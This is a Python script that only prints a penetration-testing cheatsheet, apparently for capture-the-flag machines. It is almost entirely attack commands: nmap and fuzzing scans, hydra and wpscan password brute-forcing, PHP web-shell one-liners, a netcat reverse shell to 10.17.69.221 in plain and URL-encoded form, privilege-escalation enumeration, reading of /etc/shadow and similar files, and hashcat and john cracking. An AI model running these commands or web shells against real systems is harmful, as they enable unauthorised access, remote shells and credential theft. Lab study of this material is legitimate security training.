#! /usr/bin/python
print(
'''
=======================
    PEN TEST CHEATSHEET
=======================

1. NMAP Scanning:
 
   nmap -Pn <IP> -oX NMAP.xml
   nmap -p <PORTS> -sV <IP> -oX NMAP.xml
   nmap -p- <IP> -oX NMAP.xml
   sudo nmap -p <PORTS> -sC -O -sV --script=vuln <IP> -oX NMAP.xml

   # Convert NMAP Result:
   xsltproc NMAP.xml > NMAP.html

2. Exploitation:

   **PORT 80:**
   nikto -h <URL>

   Directory Bursting:
   wfuzz -c -w raft-large-directories.txt --hc 404,403 -u "http://<IP>/FUZZ/"
   ffuf -c -w raft-large-directories.txt -ic -u http://<IP>/FUZZ -of html -o medium_files_wordlist.html

   Subdomain Fuzzing:
   ffuf -w wordlist.txt -H "Host: FUZZ.team.thm" -u http://SERVER_IP/ -fs 11366

   Password Bruteforce:
   hydra -L rockyou.txt -p 123 <IP> http-post-form '/gallery/Login.php?f=login:username=^USER^&password=^PASS^:Incorrect username or password'

   **CMS:**
   wpscan --url <URL> -e
   wpscan --url <URL> -U user.txt -P rockyou.txt
   joomscan -u <URL> -ec

   Important Files:
   robots.txt, style.css, script.js

   RCE (Remote Code Execution):
   <?php system($_GET['cmd']);?>
   <?php exec($_GET['cmd']);?>
   <?php passthru($_GET['cmd']);?>
   <?php echo shell_exec($_GET['cmd']);?>

   LFI (Local File Inclusion):
   /etc/passwd

   SQLi (SQLMAP):
   sqlmap -u <URL> --dbs

   Reverse Shell:
   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.17.69.221 4444 >/tmp/f

   Reverse Shell (URL Encoded):
   rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.17.69.221%204444%20%3E%2Ftmp%2Ff

   **PORT 139, 445 (SMB):**
   enum4linux <IP>
   smbclient //<IP>/<Shared file>

   **PORT 22 (SSH):**
   ssh <USER>@<IP>
   chmod 600 id_rsa
   ssh <USER>@<IP> -i id_rsa
   ssh <USER>@<IP> -p <PORT>
   ssh -o HostKeyAlgorithms=+ssh-rsa <USER>@<IP>

   **PORT 21 (FTP):**
   ftp <IP>

   FULLY TTY:
   python -c 'import pty; pty.spawn("/bin/bash")'
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   CTRL+Z
   stty raw -echo;fg;reset
   export TERM=linux

3. Privilege Escalation (Checklist):

   1. Check Configuration file.
   2. getcap / -r 2>/dev/null
   3. find / -perm /4000 -type f 2>/dev/null
   4. find / -perm /2000 -type f 2>/dev/null
   5. find / -user <USER_NAME> -type f 2>/dev/null
   6. sudo -l
   7. netstat -tunlp
   8. netstat -antup
   9. ss -tnlp

   **IMPORTANT Files AND Directories:**
   /etc/passwd
   /etc/shadow
   /etc/sudoers
   /etc/crontab
   /home/<USER>/.ssh
   /var/backups
   /home/<USER>
   /opt
   /var/mails
   /tmp
   /dev/shm
   /var/tmp
   /etc/os-release

   **Tools for Privilege Escalation:**
   GTFobins
   linpeas
   linenum
   linux-exploit-suggester
   Windows-Exploit-Suggester
   pspy

   ...

4. HASH Identifier:

   haiti <HASH>
   hashid <HASH_File>

5. HASH Crack:

   hashcat -m 3200 -a 0 <HASH_File> /usr/share/wordlists/rockyou.txt
   john <HASH_File> --format=mysql-sha1 --wordlist=/usr/share/wordlists/rockyou.txt
   john <HASH_File> --wordlist=/usr/share/wordlists/rockyou.txt
   john <HASH_File>


'''
)
